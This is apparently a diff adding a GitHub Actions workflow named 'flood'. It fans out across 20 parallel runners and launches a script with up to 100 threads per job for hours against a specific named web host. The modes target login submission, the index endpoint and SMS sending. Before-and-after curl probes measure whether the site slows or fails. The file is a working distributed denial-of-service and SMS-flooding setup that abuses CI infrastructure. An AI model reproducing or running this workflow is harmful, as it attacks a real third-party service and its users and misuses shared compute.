@@ -1,0 +1,51 @@
+name: run
+
+on:
+  workflow_dispatch:
+    inputs:
+      conc:
+        description: 'per-job threads'
+        default: '100'
+      dur:
+        description: 'seconds per job (max 21000)'
+        default: '1500'
+      mode:
+        description: 'loginsub | index | sendsms | mix'
+        default: 'mix'
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: egress
+        run: |
+          echo "runner=${{ matrix.shard }}"
+          curl -s --max-time 10 https://api.ipify.org || true
+          echo
+
+      - name: baseline
+        run: |
+          curl -s -k -o /dev/null -w "baseline code=%{http_code} time=%{time_total}s\n" \
+            --max-time 20 "https://ddsc.aapppp.cn/?s=/ApiIndex/index&aid=540&platform=wx"
+
+      - name: flood
+        run: |
+          python3 runner_blast.py \
+            -c "${{ github.event.inputs.conc }}" \
+            -n "${{ github.event.inputs.dur }}" \
+            --mode "${{ github.event.inputs.mode }}" \
+            $([[ "${{ github.event.inputs.mode }}" == "mix" ]] && echo "--mix")
+
+      - name: verify
+        if: always()
+        run: |
+          curl -s -k -o /dev/null -w "after  code=%{http_code} time=%{time_total}s\n" \
+            --max-time 30 "https://ddsc.aapppp.cn/?s=/ApiIndex/index&aid=540&platform=wx"
